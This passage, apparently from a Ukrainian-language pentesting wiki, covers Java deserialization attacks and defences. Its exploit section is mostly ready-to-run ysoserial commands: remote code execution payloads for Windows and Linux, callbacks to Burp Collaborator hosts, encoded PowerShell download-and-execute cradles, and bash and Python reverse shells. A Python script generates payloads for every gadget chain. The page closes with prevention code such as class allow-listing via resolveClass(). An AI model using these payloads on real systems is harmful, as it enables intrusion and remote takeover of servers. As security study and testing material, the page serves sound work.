[**–ü—Ä–æ—á–∏—Ç–∞–π—Ç–µ —Ü–µ, —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è –±—ñ–ª—å—à–µ –ø—Ä–æ Java Deserialization Scanner.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner –∑–æ—Å–µ—Ä–µ–¥–∂–µ–Ω–∏–π –Ω–∞ **`ObjectInputStream`** –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—è—Ö.

–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ [**Freddy**](https://github.com/nccgroup/freddy) –¥–ª—è **–≤–∏—è–≤–ª–µ–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó** –≤ **Burp**. –¶–µ–π –ø–ª–∞–≥—ñ–Ω –≤–∏—è–≤–∏—Ç—å **–Ω–µ —Ç—ñ–ª—å–∫–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ, –ø–æ–≤'—è–∑–∞–Ω—ñ –∑ `ObjectInputStream`**, –∞–ª–µ **—Ç–∞–∫–æ–∂** –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –∑ –±—ñ–±–ª—ñ–æ—Ç–µ–∫ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó **Json** —Ç–∞ **Yml**. –í –∞–∫—Ç–∏–≤–Ω–æ–º—É —Ä–µ–∂–∏–º—ñ –≤—ñ–Ω —Å–ø—Ä–æ–±—É—î –ø—ñ–¥—Ç–≤–µ—Ä–¥–∏—Ç–∏ —ó—Ö, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ payload'–∏ –Ω–∞ –æ—Å–Ω–æ–≤—ñ –∑–∞—Ç—Ä–∏–º–∫–∏ –∞–±–æ DNS.\
[**–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –±—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ Freddy —Ç—É—Ç.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**–¢–µ—Å—Ç –Ω–∞ —Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—é**

–ù–µ –≤—Å–µ –∑–≤–æ–¥–∏—Ç—å—Å—è –¥–æ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏, —á–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è —è–∫–∞—Å—å –≤—Ä–∞–∑–ª–∏–≤–∞ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞ —Å–µ—Ä–≤–µ—Ä–æ–º. –Ü–Ω–æ–¥—ñ –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–º—ñ–Ω–∏—Ç–∏ –¥–∞–Ω—ñ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Å–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω–æ–≥–æ –æ–±'—î–∫—Ç–∞ —ñ –æ–±—ñ–π—Ç–∏ –¥–µ—è–∫—ñ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏** (–º–æ–∂–ª–∏–≤–æ, –Ω–∞–¥–∞—Ç–∏ –≤–∞–º –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–∏–≤–Ω—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó –≤ –≤–µ–±-–¥–æ–¥–∞—Ç–∫—É).\
–Ø–∫—â–æ –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ —Å–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω–∏–π –æ–±'—î–∫—Ç java, —â–æ –Ω–∞–¥—Å–∏–ª–∞—î—Ç—å—Å—è –¥–æ –≤–µ–±-–¥–æ–¥–∞—Ç–∫—É, **–≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏** [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **–¥–ª—è –≤–∏–≤–µ–¥–µ–Ω–Ω—è –≤ –±—ñ–ª—å—à –∑—Ä–æ–∑—É–º—ñ–ª–æ–º—É —Ñ–æ—Ä–º–∞—Ç—ñ —Å–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω–æ–≥–æ –æ–±'—î–∫—Ç–∞, —â–æ –Ω–∞–¥—Å–∏–ª–∞—î—Ç—å—Å—è**. –ó–Ω–∞—é—á–∏, —è–∫—ñ –¥–∞–Ω—ñ –≤–∏ –Ω–∞–¥—Å–∏–ª–∞—î—Ç–µ, –±—É–¥–µ –ª–µ–≥—à–µ —ó—Ö –∑–º—ñ–Ω–∏—Ç–∏ —ñ –æ–±—ñ–π—Ç–∏ –¥–µ—è–∫—ñ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏.

### **–ï–∫—Å–ø–ª–æ–π—Ç**

#### **ysoserial**

–û—Å–Ω–æ–≤–Ω–∏–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó Java –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ–π - —Ü–µ [**ysoserial**](https://github.com/frohoff/ysoserial) ([**—Å–∫–∞—á–∞—Ç–∏ —Ç—É—Ç**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). –í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ —Ä–æ–∑–≥–ª—è–Ω—É—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified), —â–æ –¥–æ–∑–≤–æ–ª–∏—Ç—å –≤–∞–º –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Å–∫–ª–∞–¥–Ω—ñ –∫–æ–º–∞–Ω–¥–∏ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –∑ –∫–æ–Ω–≤–µ—î—Ä–∞–º–∏).\
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Ü–µ–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç **–∑–æ—Å–µ—Ä–µ–¥–∂–µ–Ω–∏–π** –Ω–∞ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó **`ObjectInputStream`**.\
–Ø –± **–ø–æ—á–∞–≤ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ payload "URLDNS"** **–ø–µ—Ä–µ–¥ RCE** payload, —â–æ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –º–æ–∂–ª–∏–≤–∞ —ñ–Ω'—î–∫—Ü—ñ—è. –£ –±—É–¥—å-—è–∫–æ–º—É –≤–∏–ø–∞–¥–∫—É, –∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ, –º–æ–∂–ª–∏–≤–æ, payload "URLDNS" –Ω–µ –ø—Ä–∞—Ü—é—î, –∞–ª–µ —ñ–Ω—à–∏–π RCE payload –ø—Ä–∞—Ü—é—î.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
–ö–æ–ª–∏ –≤–∏ —Å—Ç–≤–æ—Ä—é—î—Ç–µ payload –¥–ª—è **java.lang.Runtime.exec()**, –≤–∏ **–Ω–µ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Å–ø–µ—Ü—ñ–∞–ª—å–Ω—ñ —Å–∏–º–≤–æ–ª–∏** —Ç–∞–∫—ñ —è–∫ ">" –∞–±–æ "|" –¥–ª—è –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –≤–∏—Ö–æ–¥—É –≤–∏–∫–æ–Ω–∞–Ω–Ω—è, "$()" –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–º–∞–Ω–¥ –∞–±–æ –Ω–∞–≤—ñ—Ç—å **–ø–µ—Ä–µ–¥–∞–≤–∞—Ç–∏ –∞—Ä–≥—É–º–µ–Ω—Ç–∏** –∫–æ–º–∞–Ω–¥—ñ, —Ä–æ–∑–¥—ñ–ª–µ–Ω—ñ **–ø—Ä–æ–±—ñ–ª–∞–º–∏** (–≤–∏ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏ `echo -n "hello world"`, –∞–ª–µ –Ω–µ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏ `python2 -c 'print "Hello world"'`). –©–æ–± –ø—Ä–∞–≤–∏–ª—å–Ω–æ –∑–∞–∫–æ–¥—É–≤–∞—Ç–∏ payload, –≤–∏ –º–æ–∂–µ—Ç–µ [–≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —Ü—é –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–∫—É](http://www.jackson-t.ca/runtime-exec-payloads.html).

–ù–µ —Å–æ—Ä–æ–º—Ç–µ—Å—è –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —Å–∫—Ä–∏–ø—Ç –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è **–≤—Å—ñ—Ö –º–æ–∂–ª–∏–≤–∏—Ö payload –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É** –¥–ª—è Windows —ñ Linux, –∞ –ø–æ—Ç—ñ–º –ø—Ä–æ—Ç–µ—Å—Ç—É–π—Ç–µ —ó—Ö –Ω–∞ –≤—Ä–∞–∑–ª–∏–≤—ñ–π –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω—Ü—ñ:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

–í–∏ –º–æ–∂–µ—Ç–µ **–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **—Ä–∞–∑–æ–º –∑ ysoserial –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –±—ñ–ª—å—à–µ –µ–∫—Å–ø–ª–æ–π—Ç—ñ–≤**. –ë—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ —Ü–µ–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç —É **—Å–ª–∞–π–¥–∞—Ö –≤–∏—Å—Ç—É–ø—É**, –¥–µ –±—É–≤ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### marshalsec

[**marshalsec** ](https://github.com/mbechler/marshalsec)–º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó –ø–µ–π–ª–æ–∞–¥—ñ–≤ –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó —Ä—ñ–∑–Ω–∏—Ö **Json** —Ç–∞ **Yml** –±—ñ–±–ª—ñ–æ—Ç–µ–∫ —Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó –≤ Java.\
–©–æ–± —Å–∫–æ–º–ø—ñ–ª—é–≤–∞—Ç–∏ –ø—Ä–æ–µ–∫—Ç, –º–µ–Ω—ñ –ø–æ—Ç—Ä—ñ–±–Ω–æ –±—É–ª–æ **–¥–æ–¥–∞—Ç–∏** —Ü—ñ **–∑–∞–ª–µ–∂–Ω–æ—Å—Ç—ñ** –¥–æ `pom.xml`:
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**–í—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å maven**, —ñ **—Å–∫–æ–º–ø—ñ–ª—é–π—Ç–µ** –ø—Ä–æ–µ–∫—Ç:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

–î—ñ–∑–Ω–∞–π—Ç–µ—Å—è –±—ñ–ª—å—à–µ –ø—Ä–æ —Ü—é –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É Java JSON: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Labs

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø—Ä–æ—Ç–µ—Å—Ç—É–≤–∞—Ç–∏ –¥–µ—è–∫—ñ ysoserial payloads, –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–∞–ø—É—Å—Ç–∏—Ç–∏ —Ü–µ–π –≤–µ–±-–¥–æ–¥–∞—Ç–æ–∫**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Why

Java –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –±–∞–≥–∞—Ç–æ —Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó –¥–ª—è —Ä—ñ–∑–Ω–∏—Ö —Ü—ñ–ª–µ–π, —Ç–∞–∫–∏—Ö —è–∫:

* **HTTP –∑–∞–ø–∏—Ç–∏**: –°–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—è —à–∏—Ä–æ–∫–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—ñ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏, ViewState, –∫—É–∫–∞–º–∏ —Ç–æ—â–æ.
* **RMI (–í—ñ–¥–¥–∞–ª–µ–Ω–∏–π –≤–∏–∫–ª–∏–∫ –º–µ—Ç–æ–¥—ñ–≤)**: –ü—Ä–æ—Ç–æ–∫–æ–ª Java RMI, —è–∫–∏–π –ø–æ–≤–Ω—ñ—Å—Ç—é –ø–æ–∫–ª–∞–¥–∞—î—Ç—å—Å—è –Ω–∞ —Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—é, —î –æ—Å–Ω–æ–≤–æ—é –¥–ª—è –≤—ñ–¥–¥–∞–ª–µ–Ω–æ–≥–æ –∑–≤'—è–∑–∫—É –≤ Java-–¥–æ–¥–∞—Ç–∫–∞—Ö.
* **RMI —á–µ—Ä–µ–∑ HTTP**: –¶–µ–π –º–µ—Ç–æ–¥ –∑–∞–∑–≤–∏—á–∞–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è Java-–¥–æ–¥–∞—Ç–∫–∞–º–∏ –∑ —Ç–æ–≤—Å—Ç–∏–º –∫–ª—ñ—î–Ω—Ç–æ–º, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—é –¥–ª—è –≤—Å—ñ—Ö –æ–±'—î–∫—Ç–Ω–∏—Ö –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ–π.
* **JMX (–†–æ–∑—à–∏—Ä–µ–Ω–Ω—è —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è Java)**: JMX –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—é –¥–ª—è –ø–µ—Ä–µ–¥–∞—á—ñ –æ–±'—î–∫—Ç—ñ–≤ —á–µ—Ä–µ–∑ –º–µ—Ä–µ–∂—É.
* **–ö–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫—ñ –ø—Ä–æ—Ç–æ–∫–æ–ª–∏**: –£ Java —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ—é –ø—Ä–∞–∫—Ç–∏–∫–æ—é —î –ø–µ—Ä–µ–¥–∞—á–∞ —Å–∏—Ä–∏—Ö Java-–æ–±'—î–∫—Ç—ñ–≤, —â–æ –±—É–¥–µ –ø—Ä–æ–¥–µ–º–æ–Ω—Å—Ç—Ä–æ–≤–∞–Ω–æ –≤ –Ω–∞—Å—Ç—É–ø–Ω–∏—Ö –ø—Ä–∏–∫–ª–∞–¥–∞—Ö –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó.

### Prevention

#### Transient objects

–ö–ª–∞—Å, —è–∫–∏–π —Ä–µ–∞–ª—ñ–∑—É—î `Serializable`, –º–æ–∂–µ —Ä–µ–∞–ª—ñ–∑—É–≤–∞—Ç–∏ —è–∫ `transient` –±—É–¥—å-—è–∫–∏–π –æ–±'—î–∫—Ç –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–ª–∞—Å—É, —è–∫–∏–π –Ω–µ –ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ —Å–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω–∏–º. –ù–∞–ø—Ä–∏–∫–ª–∞–¥:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### –£–Ω–∏–∫–∞–π—Ç–µ —Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó –∫–ª–∞—Å—É, —è–∫–∏–π –ø–æ–≤–∏–Ω–µ–Ω —Ä–µ–∞–ª—ñ–∑–æ–≤—É–≤–∞—Ç–∏ Serializable

–£ —Å—Ü–µ–Ω–∞—Ä—ñ—è—Ö, –¥–µ –ø–µ–≤–Ω—ñ **–æ–±'—î–∫—Ç–∏ –ø–æ–≤–∏–Ω–Ω—ñ —Ä–µ–∞–ª—ñ–∑–æ–≤—É–≤–∞—Ç–∏ —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å `Serializable`** —á–µ—Ä–µ–∑ —ñ—î—Ä–∞—Ä—Ö—ñ—é –∫–ª–∞—Å—ñ–≤, —ñ—Å–Ω—É—î —Ä–∏–∑–∏–∫ –Ω–µ–Ω–∞–≤–º–∏—Å–Ω–æ—ó –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó. –©–æ–± –∑–∞–ø–æ–±—ñ–≥—Ç–∏ —Ü—å–æ–º—É, –ø–µ—Ä–µ–∫–æ–Ω–∞–π—Ç–µ—Å—è, —â–æ —Ü—ñ –æ–±'—î–∫—Ç–∏ –Ω–µ –ø—ñ–¥–ª—è–≥–∞—é—Ç—å –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó, –≤–∏–∑–Ω–∞—á–∏–≤—à–∏ `final` –º–µ—Ç–æ–¥ `readObject()`, —è–∫–∏–π –ø–æ—Å—Ç—ñ–π–Ω–æ –≤–∏–∫–∏–¥–∞—î –≤–∏–∫–ª—é—á–µ–Ω–Ω—è, —è–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∏–∂—á–µ:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **–ü–æ–∫—Ä–∞—â–µ–Ω–Ω—è –±–µ–∑–ø–µ–∫–∏ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó –≤ Java**

**–ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è `java.io.ObjectInputStream`** —î –ø—Ä–∞–∫—Ç–∏—á–Ω–∏–º –ø—ñ–¥—Ö–æ–¥–æ–º –¥–ª—è –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è –±–µ–∑–ø–µ–∫–∏ –ø—Ä–æ—Ü–µ—Å—ñ–≤ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó. –¶–µ–π –º–µ—Ç–æ–¥ –ø—ñ–¥—Ö–æ–¥–∏—Ç—å, –∫–æ–ª–∏:

* –ö–æ–¥ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó –ø—ñ–¥ –≤–∞—à–∏–º –∫–æ–Ω—Ç—Ä–æ–ª–µ–º.
* –í—ñ–¥–æ–º—ñ –∫–ª–∞—Å–∏, —è–∫—ñ –æ—á—ñ–∫—É—é—Ç—å—Å—è –¥–ª—è –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó.

–ü–µ—Ä–µ–≤–∏–∑–Ω–∞—á—Ç–µ **`resolveClass()`** –º–µ—Ç–æ–¥, —â–æ–± –æ–±–º–µ–∂–∏—Ç–∏ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—é –ª–∏—à–µ –¥–æ–∑–≤–æ–ª–µ–Ω–∏–º–∏ –∫–ª–∞—Å–∞–º–∏. –¶–µ –∑–∞–ø–æ–±—ñ–≥–∞—î –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó –±—É–¥—å-—è–∫–æ–≥–æ –∫–ª–∞—Å—É, –∫—Ä—ñ–º —Ç–∏—Ö, —â–æ —è–≤–Ω–æ –¥–æ–∑–≤–æ–ª–µ–Ω—ñ, —è–∫ —É –Ω–∞—Å—Ç—É–ø–Ω–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ, —è–∫–∏–π –æ–±–º–µ–∂—É—î –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—é –ª–∏—à–µ –∫–ª–∞—Å–æ–º `Bicycle`:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
